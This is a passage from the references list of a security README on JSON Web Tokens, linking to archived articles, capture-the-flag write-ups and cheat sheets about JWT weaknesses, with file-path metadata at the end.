  - [Hacking JSON Web Tokens - Vickie Li - October 27, 2019](https://web.archive.org/web/20191028125424/https://medium.com/swlh/hacking-json-web-tokens-jwts-9122efe91e4a)\n\
  - [HITBGSEC CTF 2017 - Pasty (Web) - amon (j.heng) - August 27, 2017](https://web.archive.org/web/20240229055017/https://nandynarwhals.org/hitbgsec2017-pasty/)\n\
  - [How to Hack a Weak JWT Implementation with a Timing Attack - Tamas Polgar - January 7, 2017](https://web.archive.org/web/20190331200826/https://hackernoon.com/can-timing-attack-be-a-practical-security-threat-on-jwt-signature-ba3c8340dea9)\n\
  - [JSON Web Token Validation Bypass in Auth0 Authentication API - Ben Knight - April 16, 2020](https://web.archive.org/web/20230104231143/https://insomniasec.com/blog/auth0-jwt-validation-bypass)\n\
  - [JSON Web Token Vulnerabilities - 0xn3va - March 27, 2022](https://web.archive.org/web/20260305090633/https://0xn3va.gitbook.io/cheat-sheets/web-application/json-web-token-vulnerabilities)\n\
  - [JWT Hacking 101 - TrustFoundry - Tyler Rosonke - December 8, 2017](https://web.archive.org/web/20190405023824/https://trustfoundry.net/jwt-hacking-101/)\n\
  - [Learn how to use JSON Web Tokens (JWT) for Authentication - dwyl - May 3, 2022](https://github.com/dwyl/learn-json-web-tokens)\n\
  - [Privilege Escalation like a Boss - janijay007 - October 27, 2018](https://web.archive.org/web/20190723093831/https://blog.securitybreached.org/2018/10/27/privilege-escalation-like-a-boss/)\n\
  - [Simple JWT hacking - Hari Prasanth (@b1ack_h00d) - March 7, 2019](https://web.archive.org/web/20200724145838/https://medium.com/@blackhood/simple-jwt-hacking-73870a976750)\n\
  - [WebSec CTF - Authorization Token - JWT Challenge - Kris Hunt - August 7, 2016](https://web.archive.org/web/20211025223311/https://ctf.rip/websec-ctf-authorization-token-jwt-challenge/)\n\
  - [Write up – JRR Token – LeHack 2019 - Laphaze - July 7, 2019](https://web.archive.org/web/20210512205928/https://rootinthemiddle.org/write-up-jrr-token-lehack-2019/)"
_relative_path: JSON Web Token/README.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/payloadsallthethings/JSON Web Token/README.md
````
